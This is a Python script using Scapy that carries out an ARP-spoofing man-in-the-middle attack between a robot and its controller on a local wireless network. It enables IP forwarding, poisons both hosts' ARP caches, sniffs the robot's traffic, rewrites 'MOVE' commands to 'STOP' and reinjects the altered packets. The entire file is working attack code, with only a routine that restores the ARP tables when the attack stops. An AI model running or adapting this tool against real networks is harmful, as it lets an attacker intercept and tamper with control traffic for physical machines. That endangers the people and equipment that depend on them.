from scapy.all import *
import time
import os
import subprocess
import re

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.179"
interface     = "wlan0"

def enable_ip_forwarding():
    current = open("/proc/sys/net/ipv4/ip_forward").read().strip()
    if current != "1":
        print("[!] IP forwarding OFF — enabling.")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("[*] IP forwarding already enabled.")

def get_mac(ip):
    # Ping more aggressively to populate the ARP cache
    print(f"[*] Pinging {ip} to populate ARP cache...")
    subprocess.run(["ping", "-c", "5", "-W", "2", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Read ARP table — drop the strict 0x2 flag requirement
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if len(fields) < 4:
                    continue
                if fields[0] == ip:
                    mac = fields[3]
                    flag = fields[2]
                    print(f"[*] ARP entry: {ip} -> {mac} (flag={flag})")
                    # Skip genuinely empty entries
                    if mac == "00:00:00:00:00:00":
                        print(f"[!] ARP entry for {ip} is incomplete, trying arping...")
                        break
                    return mac
    except Exception as e:
        print(f"[!] Error reading ARP table: {e}")

    # arping fallback
    print(f"[*] Trying arping for {ip}...")
    try:
        result = subprocess.run(
            ["arping", "-I", interface, "-c", "5", "-w", "5", ip],
            capture_output=True, text=True
        )
        print(f"[DEBUG] arping output:\n{result.stdout}")  # Temporary — shows raw output
        match = re.search(r'\[([0-9a-f:]{17})\]', result.stdout, re.IGNORECASE)
        if match:
            mac = match.group(1)
            print(f"[*] {ip} resolved to {mac} (via arping)")
            return mac
    except FileNotFoundError:
        print("[!] arping not found: sudo apt install iputils-arping")

    print(f"[!] Could not resolve MAC for {ip}")
    return None
    
def spoof(target_ip, host_ip, target_mac):
    # Wrap ARP in an Ethernet frame — sendp() operates at L2
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=host_ip
    )
    sendp(packet, iface=interface, verbose=False)

def restore_arp(target_ip, target_mac, real_src_ip, real_src_mac, count=10):
    print(f"[*] Restoring ARP for {target_ip}...")
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=real_src_ip,
        hwsrc=real_src_mac
    )
    sendp(packet, iface=interface, count=count, inter=0.2, verbose=False)

def modify_packet(pkt):
    if not (pkt.haslayer(Raw) and pkt.haslayer(IP)):
        return

    payload = pkt[Raw].load.decode(errors='ignore')
    direction = "→ Robot" if pkt[IP].dst == robot_ip else "→ Controller"

    if "MOVE" in payload:
        print(f"[!] Intercepted ({direction}): {payload.strip()}")
        new_payload = payload.replace("MOVE", "STOP")
        pkt[Raw].load = new_payload.encode()

        del pkt[IP].len
        del pkt[IP].chksum
        if pkt.haslayer(TCP): del pkt[TCP].chksum
        if pkt.haslayer(UDP): del pkt[UDP].chksum

        sendp(pkt, iface=interface, verbose=False)
        print(f"[*] Injected ({direction}): {new_payload.strip()}")
    else:
        sendp(pkt, iface=interface, verbose=False)

# ── Startup ──────────────────────────────────────────────────────────────────
enable_ip_forwarding()

print("[*] Resolving MACs...")
robot_mac      = get_mac(robot_ip)
controller_mac = get_mac(controller_ip)

if not robot_mac or not controller_mac:
    print(f"[!] MAC resolution failed: robot={robot_mac}, controller={controller_mac}")
    exit(1)

print(f"[*] Robot:      {robot_ip} @ {robot_mac}")
print(f"[*] Controller: {controller_ip} @ {controller_mac}")

# ── Attack Loop ───────────────────────────────────────────────────────────────
try:
    print("[*] MitM active. Ctrl+C to stop.\n")
    while True:
        spoof(robot_ip,      controller_ip, robot_mac)
        spoof(controller_ip, robot_ip,      controller_mac)
        sniff(iface=interface, filter=f"ip host {robot_ip}",
              prn=modify_packet, timeout=2, store=0)

except KeyboardInterrupt:
    print("\n[*] Stopping attack...")
    restore_arp(robot_ip,      robot_mac,      controller_ip, controller_mac)
    restore_arp(controller_ip, controller_mac, robot_ip,      robot_mac)
    print("[*] Done.")